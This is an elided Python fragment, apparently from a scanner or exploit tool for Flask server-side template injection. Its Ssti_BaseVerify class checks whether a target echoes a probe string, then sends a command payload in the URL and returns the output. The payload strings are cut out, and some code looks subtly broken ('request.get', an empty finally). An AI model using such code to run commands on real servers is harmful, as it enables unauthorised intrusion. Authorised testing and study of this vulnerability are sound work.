...
class Ssti_BaseVerify:
    ...
    def check(self):
        ...
        try:
            ...
            if check_req.text == 'Hello %s' %(self.capta) and check_req.status_code == 200:
                return True
            else:
                return False
    ...
    def cmd(self, cmd):
        ...
        try:
            if self.check():
                ...
                cmd_req = request.get(self.url + cmd_payload, headers = self.headers)
                result = cmd_req.text.replace('\n', '')
                return True, result
            else:
                return False, 'Falsk SSTI注入漏洞'
        except Exception as e:
            print(e)
            return False, e
        finally:
